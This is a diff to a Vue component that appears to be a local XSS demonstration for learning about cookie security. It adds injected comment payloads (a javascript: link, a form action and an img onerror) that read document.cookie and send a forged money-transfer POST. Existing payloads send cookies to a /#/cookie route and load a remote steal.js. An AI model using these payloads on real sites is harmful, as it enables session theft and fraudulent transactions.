@@ -17,6 +17,20 @@
 
 <script>
 console.log(import.meta.env)
+
+/**
+ * @description 
+ * 若 cookie 有加上 httpOnly, 就無法在瀏覽器上使用 document.cookie 取得該欄位了; 可以避免 XSS 取得 cookie 的攻擊
+ * 而 secure 則是只有 https 時才會送出, Example: document.cookie='key=value;secure'
+ */
+const xssAttack = `
+  console.log('steel cookie', document.cookie);
+
+  var request = new XMLHttpRequest();
+  request.open('POST', 'http://localhost:9527/money/transfer?targetId=123&money=10000');
+  request.send();
+`
+
 export default {
   data () {
     return {
@@ -27,6 +41,9 @@ export default {
         '只要你不尷尬，尷尬的就是別人',
         '很重要所以說三次！！',
         '不錯的文章<a href="#" onclick="window.open(`/#/cookie?cookie=${document.cookie}`, \'_blank\')">點我看更多</a>',
+        `<a href="javascript: ${xssAttack};">我來了</a>`,
+        `<form action="javascript: ${xssAttack};"><button type="submit">點擊取錢</button></form>`,
+        `測試圖片error<img src="xxx.com" onerror="${xssAttack}"/>`,
         '測試圖片error<img src="xxx.com" onerror="fetch(`/#/cookie?cookie=${document.cookie}`)"/>',
         '讚一個吧<img src="http://127.0.0.1:5173/src/steal.js"></img>'
       ]
